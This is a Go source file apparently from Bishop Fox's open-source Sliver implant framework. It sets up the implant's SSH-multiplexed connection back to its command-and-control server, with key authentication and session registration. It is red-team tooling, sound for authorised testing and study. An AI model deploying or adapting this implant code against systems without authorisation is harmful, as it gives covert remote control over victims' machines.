package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"io"
	"net"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/constants"
)

// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
func InitClient(conn net.Conn, isTunnel bool, key []byte) (ss io.ReadWriteCloser, err error) {
	// Return if we don't have what we need.
	if conn == nil {
		return nil, errors.New("net.Conn is nil, cannot init Comm")
	}

	// New SSH multiplexer Comm
	comm := &Comm{mutex: &sync.RWMutex{}}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = comm.setupAuthClient(key, constants.SliverName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// We are the client of the C2 server here.
	comm.sshConn, comm.inbound, comm.requests, err = ssh.NewClientConn(conn, "", comm.clientConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	go comm.serveRequests() // Serve pings & requests with keepalive policies.

	// If the conn is not a tunnel, the session is not
	// registered yet. Get and return a stream for this.
	if !isTunnel {
		ss, err = comm.initSessionClient()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to setup C2 stream: %s", err.Error())
			// {{end}}
			return
		}
	}

	Comms.Add(comm)                // Everything is up and running, register the mux.
	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.

	return
}

// setupAuthClient - The Comm prepares SSH code and security details for a client connection.
func (comm *Comm) setupAuthClient(key []byte, name string) (err error) {

	// Private key is used to authenticate to the server/pivot.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("SSH failed to parse Private Key: %s", err.Error())
		// {{end}}
		return
	}

	comm.clientConfig = &ssh.ClientConfig{
		User:            name,                                     // The user is the implant name.
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)}, // Authenticate as the implant.
		HostKeyCallback: comm.verifyServer,                        // Checks the key given by the server/pivot.
	}

	return
}

// initSessionClient - The multiplexer has just been created and set up, and we need to register
// the implant session for this physical connection. We create a dedicated stream and return it.
func (m *Comm) initSessionClient() (stream io.ReadWriteCloser, err error) {
	if m.sshConn == nil {
		// {{if .Config.Debug}}
		log.Printf("Tried to open channel on nil SSH connection")
		// {{end}}
		return
	}

	select {
	case ch := <-m.inbound:
		info := &sliverpb.ConnectionInfo{}
		proto.Unmarshal(ch.ExtraData(), info)

		if ch.ChannelType() != "session" || info.ID != "REGISTRATION" {
			err = ch.Reject(ssh.Prohibited, "")
			return nil, errors.New("Bad payload information for registration")
		}

		c2Stream, reqs, err := ch.Accept()
		if err != nil {
			return nil, err
		}
		go ssh.DiscardRequests(reqs)

		// {{if .Config.Debug}}
		log.Printf("Opened Session stream")
		// {{end}}

		stream = io.ReadWriteCloser(c2Stream)
		return stream, err

	case <-time.After(defaultNetTimeout):
		return nil, errors.New("[mux] timed out waiting muxed stream for RPC C2 layer")
	}
}
